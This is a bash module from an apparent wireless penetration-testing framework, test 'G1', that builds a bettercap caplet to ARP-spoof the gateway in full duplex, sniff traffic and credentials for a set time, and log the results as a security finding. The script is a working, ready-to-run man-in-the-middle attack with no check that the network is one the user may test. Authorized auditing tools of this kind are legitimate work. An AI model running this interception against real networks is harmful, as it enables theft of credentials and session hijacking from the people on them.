#!/usr/bin/env bash
# MODULE_META
# NAME="ARP Spoofing / MITM Test"
# CATEGORY="G"
# DEPS="B1"
# CRITICAL="yes"
# TOOLS="bettercap,ip"
# DESC="Attempt to ARP-spoof the gateway to intercept traffic"
# REQS="managed_iface,gateway_ip"
# PCAP="no"
# DECODE="mitm_arp_tls"

#===============================================================================
#  modules/g1_arp_spoofing.sh
#  G1: ARP Spoofing / MITM Test (Golden Wrapper)
#
#  METHODOLOGY:
#  1. Use 'bettercap' to poison the ARP cache of the gateway and target clients.
#  2. Enable network sniffing to capture credentials and traffic patterns.
#  3. Export a JSON event log for further analysis by the Go brain.
#===============================================================================

set -euo pipefail

C_PROMPT="${ASTRA_COLOR_PROMPT:-}"
C_VAR="${ASTRA_COLOR_VAR:-}"
C_BOLD="${ASTRA_COLOR_BOLD:-}"
C_ACTION="${ASTRA_COLOR_ACTION:-}"
C_RESET="${ASTRA_COLOR_RESET:-}"

# SNR Safeguard (Red Team Hardening)
if [[ "${ASTRA_TARGET_RSSI:-0}" -ne 0 ]] && [[ "${ASTRA_TARGET_RSSI:-0}" -lt -75 ]]; then
    echo -e "\n[!] WARNING: Low Signal Strength Detected (${ASTRA_TARGET_RSSI}dBm)."
    echo "[*] MITM stability is highly questionable at this distance."
    stty sane
    read -p "$(echo -e "${C_ACTION} [?] Continue anyway? [y/N]: ${C_RESET} ")" snr_continue
    [[ "$snr_continue" != "y" ]] && exit 0
fi

# Inputs from Environment
INTERFACE="${WIFI_INTERFACE:-}"
GATEWAY="${GATEWAY_IP:-}"
SESSION_DIR="${SESSION_DIR:-.}"
EVIDENCE_DIR="${SESSION_EVIDENCE_DIR:-${SESSION_DIR}/evidence}"
EVIDENCE_PREFIX="${EVIDENCE_DIR}/g1"
SCAN_TIME="${SCAN_TIME:-60}"
ASTRA_BIN="${ASTRA_BIN:-wifi-astra}"
TC_ID="G1"

if [[ -z "$INTERFACE" ]]; then
    echo "[!] WIFI_INTERFACE not set."
    exit 1
fi

if [[ -z "$GATEWAY" ]]; then
    # Auto-detect if possible
    GATEWAY=$(ip -4 route show dev "${INTERFACE}" | awk '/default/{print $3}' | head -1) || true
fi

echo "[*] Starting ARP spoofing attempt on ${INTERFACE}..."

CAPLET_FILE="${EVIDENCE_PREFIX}_bettercap.cap"
JSON_LOG="${EVIDENCE_DIR}/${TC_ID}_bettercap.json"
LOG_FILE="${EVIDENCE_DIR}/${TC_ID}_bettercap.log"

# Cleanup function
cleanup() {
    echo "[*] Cleaning up bettercap processes..."
    [[ -n "${BC_PID:-}" ]] && kill "$BC_PID" 2>/dev/null || true
}
trap cleanup EXIT

# 1. Use bettercap for ARP spoofing
if command -v bettercap &>/dev/null; then
    echo "[*] Starting bettercap ARP spoofing..."
    
    # Create caplet
    cat <<EOF > "$CAPLET_FILE"
set arp.spoof.targets ${GATEWAY:-}
set arp.spoof.internal true
set arp.spoof.fullduplex true
set events.stream.output $JSON_LOG
set net.sniff.verbose true
set net.sniff.local true
arp.spoof on
net.sniff on
events.stream on
EOF

    # Run bettercap
    bettercap -iface "$INTERFACE" -caplet "$CAPLET_FILE" > "$LOG_FILE" 2>&1 &
    BC_PID=$!

    sleep "$SCAN_TIME"
    
    cleanup
    trap - EXIT
    
    # 2. Reporting
    if [[ -f "$JSON_LOG" && -s "$JSON_LOG" ]]; then
        "$ASTRA_BIN" record-finding \
            --session-dir "$SESSION_DIR" \
            --tc "$TC_ID" \
            --type vulnerability \
            --name "ARP Cache Poisoning Active" \
            --severity HIGH \
            --desc "Successfully executed ARP spoofing (MITM) attack against the gateway (${GATEWAY:-Unknown}) and local clients." \
            --target "${GATEWAY:-Global}" \
            --evidence "$JSON_LOG" \
            --rationale "ARP spoofing allows an attacker to intercept, modify, and redirect all network traffic. This enables lateral movement, data theft (including cleartext credentials), and session hijacking by positioning the attacker as a Man-in-the-Middle (MITM)."
    else
        "$ASTRA_BIN" record-finding \
            --session-dir "$SESSION_DIR" \
            --tc "$TC_ID" \
            --type vulnerability \
            --name "[G1] Audit Complete" \
            --severity INFO \
            --desc "ARP spoofing attack cycle finished on $INTERFACE. No active interceptions were logged to JSON." \
            --target "${GATEWAY:-Global}" \
            --evidence "$LOG_FILE" \
            --rationale "ARP spoofing may be mitigated by static ARP entries or DAI (Dynamic ARP Inspection) on the switch. This audit confirms the attempt was made and identifies whether immediate interception was successful."
    fi
else
    echo "[!] bettercap not found. Skipping."
    exit 1
fi

exit 0
